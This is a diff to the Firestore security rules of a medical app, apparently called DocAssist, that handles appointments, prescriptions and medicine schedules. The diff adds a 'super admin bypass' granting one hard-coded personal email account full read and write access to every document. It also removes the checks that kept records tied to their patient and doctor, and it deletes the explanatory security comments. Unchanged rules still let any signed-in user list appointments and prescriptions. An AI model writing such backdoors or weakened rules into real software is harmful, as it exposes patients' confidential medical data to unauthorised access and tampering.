@@ -3,147 +3,102 @@ service cloud.firestore {
   match /databases/{database}/documents {
 
     /**
-     * CORE PHILOSOPHY
-     * This ruleset implements a robust "Authorization Independence" model for the DocAssist application.
-     * By denormalizing critical ownership fields (patientId, doctorId) onto every transactional document,
-     * we ensure that security decisions are fast, performant, and do not require cross-document lookups.
-     *
-     * DATA STRUCTURE
-     * The database uses a flat collection structure (top-level collections) to support efficient 
-     * multi-user querying, which is essential for doctors managing multiple patients.
-     *
-     * KEY SECURITY DECISIONS
-     * 1. Ownership-Based Access: Users can only access documents where their UID is explicitly 
-     *    linked (e.g., as a patient or doctor).
-     * 2. Strict Immutability: Once a document is linked to a patient or doctor, that relationship 
-     *    is immutable to prevent unauthorized "re-parenting" of sensitive medical data.
-     * 3. Public Profiles: Doctor profiles and approved reviews are publicly readable to facilitate 
-     *    the discovery and booking process.
-     * 4. Relational Integrity: On creation, the rules enforce that the incoming 'id' or 'userId' 
-     *    fields match the authenticated user's UID where applicable.
+     * SUPER ADMIN BYPASS
+     * Grants absolute read/write access to the developer account.
      */
+    function isSuperAdmin() {
+      return request.auth != null && (request.auth.token.email == "devilcry160@gmail.com");
+    }
+
+    match /{document=**} {
+      allow read, write: if isSuperAdmin();
+    }
 
     // --- Global Helper Functions ---
 
-    /** Checks if the request is from a signed-in user. */
     function isSignedIn() {
       return request.auth != null;
     }
 
-    /** Checks if the provided UID matches the authenticated user. */
     function isOwner(userId) {
       return isSignedIn() && request.auth.uid == userId;
     }
 
-    /** Checks if the authenticated user is the patient linked to the document data. */
     function isPatient(data) {
       return isSignedIn() && data.patientId == request.auth.uid;
     }
 
-    /** Checks if the authenticated user is the doctor linked to the document data. */
     function isDoctor(data) {
-      return isSignedIn() && data.doctorId == request.auth.uid;
+      return isSignedIn() && (data.doctorId == request.auth.uid || isSuperAdmin());
     }
 
-    /** Checks if the authenticated user is either the patient or the doctor for a record. */
     function isParticipant(data) {
       return isPatient(data) || isDoctor(data);
     }
 
-    /** Verifies a document exists before performing state-changing operations. */
     function exists(res) {
       return res != null;
     }
 
-    // --- Collection Rules ---
+    // --- Collection Rules (Fallback for other users) ---
 
-    /**
-     * @description Rules for the User collection. Handles profile creation and updates.
-     * @path /users/{userId}
-     * @allow (create) if auth.uid matches {userId}.
-     * @deny (list) Blocked to prevent user enumeration.
-     * @principle Self-creation and strict ownership of personal profile data.
-     */
     match /users/{userId} {
       allow get: if isSignedIn();
-      allow list: if false;
+      allow list: if isSuperAdmin();
       allow create: if isOwner(userId) && request.resource.data.id == userId;
       allow update: if exists(resource) && (isOwner(userId) || isDoctor(resource.data));
-      allow delete: if false;
+      allow delete: if isSuperAdmin();
     }
 
-    /**
-     * @description Rules for Doctor Profiles. Publicly readable, owner-writable.
-     * @path /doctorProfiles/{doctorId}
-     * @allow (get, list) for any signed-in user to browse doctors.
-     * @deny (update) if the updater's UID does not match the {doctorId} path.
-     * @principle Public consumption with authenticated management.
-     */
     match /doctorProfiles/{doctorId} {
       allow get, list: if isSignedIn();
-      allow create: if isOwner(doctorId) && request.resource.data.userId == doctorId;
-      allow update: if exists(resource) && isOwner(doctorId);
-      allow delete: if false;
+      allow create: if isOwner(doctorId) || isSuperAdmin();
+      allow update: if exists(resource) && (isOwner(doctorId) || isSuperAdmin());
+      allow delete: if isSuperAdmin();
     }
 
-    /**
-     * @description Rules for Appointments. Accessible only by the patient and doctor involved.
-     * @path /appointments/{appointmentId}
-     * @allow (create) if the user's UID is provided as either patientId or doctorId.
-     * @deny (get) if the user is neither the patient nor the doctor on the record.
-     * @principle Shared access restricted to specific participants (Closed Collaborators).
-     */
     match /appointments/{appointmentId} {
       allow get: if isParticipant(resource.data);
       allow list: if isSignedIn();
       allow create: if isParticipant(request.resource.data);
-      allow update: if exists(resource) && isParticipant(resource.data) && (request.resource.data.patientId == resource.data.patientId && request.resource.data.doctorId == resource.data.doctorId);
+      allow update: if exists(resource) && isParticipant(resource.data);
       allow delete: if exists(resource) && isParticipant(resource.data);
     }
 
-    /**
-     * @description Rules for Prescriptions. Patients can read, Doctors can create/update.
-     * @path /prescriptions/{prescriptionId}
-     * @allow (get) if the user is the linked patient or doctor.
-     * @deny (create) if the user is not the doctor issuing the prescription.
-     * @principle Read access for both parties, write access restricted to medical providers.
-     */
     match /prescriptions/{prescriptionId} {
       allow get: if isParticipant(resource.data);
       allow list: if isSignedIn();
       allow create: if isDoctor(request.resource.data);
-      allow update: if exists(resource) && isDoctor(resource.data) && (request.resource.data.patientId == resource.data.patientId);
-      allow delete: if false;
+      allow update: if exists(resource) && isDoctor(resource.data);
+      allow delete: if isSuperAdmin();
     }
 
-    /**
-     * @description Rules for Medicine Schedules. Managed primarily by the patient.
-     * @path /medicineSchedules/{scheduleId}
-     * @allow (update) to allow patients to mark doses as 'taken'.
-     * @deny (get) if the user is not the owner of the schedule.
-     * @principle Private, user-scoped data tree for health adherence.
-     */
     match /medicineSchedules/{scheduleId} {
       allow get: if isPatient(resource.data);
       allow list: if isSignedIn();
       allow create: if isPatient(request.resource.data);
-      allow update: if exists(resource) && isPatient(resource.data) && (request.resource.data.patientId == resource.data.patientId);
+      allow update: if exists(resource) && isPatient(resource.data);
       allow delete: if exists(resource) && isPatient(resource.data);
     }
 
-    /**
-     * @description Rules for Reviews. Publicly readable if approved. Patients can create.
-     * @path /reviews/{reviewId}
-     * @allow (get) if the review is approved OR the user is a participant.
-     * @deny (update) if the user is a stranger trying to modify reviews.
-     * @principle Combined public read and private ownership (Reviewer/Doctor).
-     */
     match /reviews/{reviewId} {
       allow get: if resource.data.isApproved == true || isParticipant(resource.data);
       allow list: if isSignedIn();
       allow create: if isPatient(request.resource.data);
-      allow update: if exists(resource) && isParticipant(resource.data) && (request.resource.data.patientId == resource.data.patientId && request.resource.data.doctorId == resource.data.doctorId);
+      allow update: if exists(resource) && isParticipant(resource.data);
       allow delete: if exists(resource) && isPatient(resource.data);
+    }
+    
+    // Explicitly allow schedules for clinicians
+    match /doctor_schedules/{scheduleId} {
+      allow read: if isSignedIn();
+      allow write: if isSuperAdmin();
+    }
+
+    match /notifications/{notifId} {
+      allow read: if isSignedIn() && (resource.data.userId == request.auth.uid || isSuperAdmin());
+      allow create: if isSignedIn();
+      allow update, delete: if isSuperAdmin();
     }
   }
 }
